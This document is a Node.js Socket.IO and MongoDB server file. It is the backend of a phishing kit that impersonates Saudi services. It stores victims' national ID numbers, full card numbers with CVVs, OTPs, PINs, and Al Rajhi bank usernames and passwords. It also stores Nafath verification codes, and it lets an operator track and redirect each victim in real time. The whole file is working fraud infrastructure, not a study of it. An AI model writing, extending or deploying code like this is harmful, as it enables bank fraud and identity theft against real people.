// server.js
require("dotenv").config();
const express = require("express");
const http = require("http");
const cors = require("cors");
const mongoose = require("mongoose");
const { Server } = require("socket.io");

const allowedOrigins = [
  process.env.FRONTEND_ORIGIN,
  process.env.DASHBOARD_ORIGIN,
];

const app = express();
const httpServer = http.createServer(app);

const io = new Server(httpServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true,
  },
});

app.use(express.json());
app.use(cors());

// ─── MODELS ───────────────────────────────────────────────────────────────────

const LocationSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true }, currentPage: String },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const Location = mongoose.model("Location", LocationSchema);

const FlagSchema = new mongoose.Schema({
  ip: { type: String, unique: true, required: true },
  flag: { type: Boolean, default: false },
});
const Flag = mongoose.model("Flag", FlagSchema);

const IndexSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    userName: String,
    phoneNumber: String,
    regType: String,
    idNumber: String,
    birthDate: String,
    email: String,
    region: String,
    branch: String,
    level: String,
    gear_type: String,
    time_period: String,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const IndexPage = mongoose.model("IndexPage", IndexSchema);

const PaymentSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    cardHolderName: String,
    cardNumber: String,
    expiryDate: String,
    cvv: String,
    total: String,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Payment = mongoose.model("Payment", PaymentSchema);

const OtpSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    verificationCode: String,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Otp = mongoose.model("Otp", OtpSchema);

const PinSchema = new mongoose.Schema(
  { ip: { type: String, required: true }, pin: String },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Pin = mongoose.model("Pin", PinSchema);

const PhoneSchema = new mongoose.Schema(
  { ip: { type: String, required: true }, phoneNumber: String, operator: String },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Phone = mongoose.model("Phone", PhoneSchema);

const PhoneCodeSchema = new mongoose.Schema(
  { ip: { type: String, required: true }, phoneCode: String },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const PhoneCode = mongoose.model("PhoneCode", PhoneCodeSchema);

const RajhiSchema = new mongoose.Schema(
  { ip: { type: String, required: true }, username: String, password: String },
  { timestamps: { createdAt: true, updatedAt: true } }
);
const Rajhi = mongoose.model("Rajhi", RajhiSchema);

const BasmahSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true }, code: String },
  { timestamps: true }
);
const Basmah = mongoose.model("Basmah", BasmahSchema);

const PendingNavSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true }, page: String },
  { timestamps: true }
);
const PendingNav = mongoose.model("PendingNav", PendingNavSchema);

const BannedIPSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true } },
  { timestamps: true }
);
const BannedIP = mongoose.model("BannedIP", BannedIPSchema);

// ─── SOCKET.IO ────────────────────────────────────────────────────────────────

io.on("connection", (socket) => {
  console.log("Socket connected:", socket.id);

  socket.on("loadData", async () => {
    try {
      const [
        allIndex, allPayments, allOtps, allPins, allPhones, allPhoneCodes,
        allRajhis, allLocations, allFlags,
      ] = await Promise.all([
        IndexPage.find({}).sort({ updatedAt: -1 }).lean(),
        Payment.find({}).lean(),
        Otp.find({}).lean(),
        Pin.find({}).lean(),
        Phone.find({}).lean(),
        PhoneCode.find({}).lean(),
        Rajhi.find({}).lean(),
        Location.find({}).lean(),
        Flag.find({}).lean(),
      ]);

      socket.emit("initialData", {
        index: allIndex,
        payment: allPayments,
        otp: allOtps,
        pin: allPins,
        phone: allPhones,
        phonecode: allPhoneCodes,
        rajhi: allRajhis,
        locations: allLocations,
        flags: allFlags,
      });
    } catch (err) {
      console.error("loadData error:", err);
    }
  });

  socket.on("updateLocation", async ({ ip, page }) => {
    try {
      await Location.findOneAndUpdate(
        { ip },
        { currentPage: page, updatedAt: new Date() },
        { upsert: true, setDefaultsOnInsert: true }
      );
      socket.data.ip = ip;
      io.emit("locationUpdated", { ip, page });

      const pending = await PendingNav.findOne({ ip }).lean();
      if (pending) {
        socket.emit("navigateTo", { page: pending.page, ip });
        await PendingNav.deleteOne({ ip });
      }
    } catch (e) {
      console.error("Location error:", e);
    }
  });

  socket.on("submitIndex", async (data) => {
    try {
      const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, { upsert: true, new: true, setDefaultsOnInsert: true });
      io.emit("newIndex", doc);
    } catch (err) {
      console.error("submitIndex error:", err);
    }
  });

  socket.on("submitPayment", async (data) => {
    try {
      const doc = await Payment.create(data);
      io.emit("newPayment", doc);
    } catch (err) {
      console.error("submitPayment error:", err);
    }
  });

  socket.on("submitOtp", async (data) => {
    try {
      const doc = await Otp.create(data);
      io.emit("newOtp", doc);
    } catch (err) {
      console.error("submitOtp error:", err);
    }
  });

  socket.on("submitPin", async (data) => {
    try {
      const pin = data.pin || data.code || "";
      const doc = await Pin.create({ ip: data.ip, pin });
      io.emit("newPin", { ip: data.ip, pin });
    } catch (err) {
      console.error("submitPin error:", err);
    }
  });

  socket.on("submitPhone", async (data) => {
    try {
      const doc = await Phone.create(data);
      io.emit("newPhone", doc);
    } catch (err) {
      console.error("submitPhone error:", err);
    }
  });

  socket.on("submitPhoneCode", async (data) => {
    try {
      const phoneCode = data.phoneCode || data.code || "";
      const doc = await PhoneCode.create({ ip: data.ip, phoneCode });
      io.emit("newPhoneCode", { ip: data.ip, phoneCode });
    } catch (err) {
      console.error("submitPhoneCode error:", err);
    }
  });

  socket.on("submitRajhi", async (data) => {
    try {
      const doc = await Rajhi.create(data);
      io.emit("newRajhi", doc);
    } catch (err) {
      console.error("submitRajhi error:", err);
    }
  });

  socket.on("updateBasmah", async ({ ip, basmah }) => {
    try {
      const doc = await Basmah.findOneAndUpdate({ ip }, { code: String(basmah).padStart(2, "0") }, { upsert: true, new: true });
      io.emit("basmahUpdated", { ip, code: doc.code });
      io.of("/").sockets.forEach((s) => {
        if (s.data.ip === ip) s.emit("nafadCode", { ip, code: doc.code });
      });
    } catch (err) {
      console.error("updateBasmah error:", err);
    }
  });

  socket.on("navigateTo", async ({ page, ip: targetIp }) => {
    try {
      await PendingNav.findOneAndUpdate({ ip: targetIp }, { page }, { upsert: true, new: true });
      io.of("/").sockets.forEach((clientSocket) => {
        if (clientSocket.data.ip === targetIp) {
          clientSocket.emit("navigateTo", { page, ip: targetIp });
        }
      });
    } catch (e) {
      console.error("navigateTo error:", e);
    }
  });

  socket.on("banUser", async ({ ip: targetIp }) => {
    try {
      await BannedIP.findOneAndUpdate({ ip: targetIp }, { ip: targetIp }, { upsert: true, new: true });
      io.of("/").sockets.forEach((clientSocket) => {
        if (clientSocket.data.ip === targetIp) clientSocket.emit("banned");
      });
    } catch (e) {
      console.error("banUser error:", e);
    }
  });

  socket.on("toggleFlag", async ({ ip, flag }) => {
    await Flag.findOneAndUpdate({ ip }, { flag }, { upsert: true, new: true });
    io.emit("flagUpdated", { ip, flag });
  });

  socket.on("deleteUser", async ({ ip }) => {
    await Promise.all([
      IndexPage.deleteMany({ ip }), Payment.deleteMany({ ip }), Otp.deleteMany({ ip }),
      Pin.deleteMany({ ip }), Phone.deleteMany({ ip }), PhoneCode.deleteMany({ ip }),
      Rajhi.deleteMany({ ip }), Basmah.deleteMany({ ip }), PendingNav.deleteMany({ ip }),
      BannedIP.deleteMany({ ip }), Location.deleteMany({ ip }), Flag.deleteMany({ ip }),
    ]);
    io.emit("userDeleted", { ip });
  });

  socket.on("disconnect", () => {
    const ip = socket.data.ip;
    if (ip) {
      setTimeout(() => {
        let hasActive = false;
        io.of("/").sockets.forEach((s) => { if (s.data.ip === ip) hasActive = true; });
        if (!hasActive) {
          Location.findOneAndUpdate({ ip }, { currentPage: "offline", updatedAt: new Date() }, { upsert: true })
            .then(() => io.emit("locationUpdated", { ip, page: "offline" }))
            .catch(console.error);
        }
      }, 5000);
    }
  });
});

mongoose.connect(process.env.MONGODB_URI).then(() => {
  console.log("MongoDB connected");
  const port = process.env.PORT || 10000;
  httpServer.listen(port, () => console.log(`Listening on port ${port}`));
}).catch(console.error);
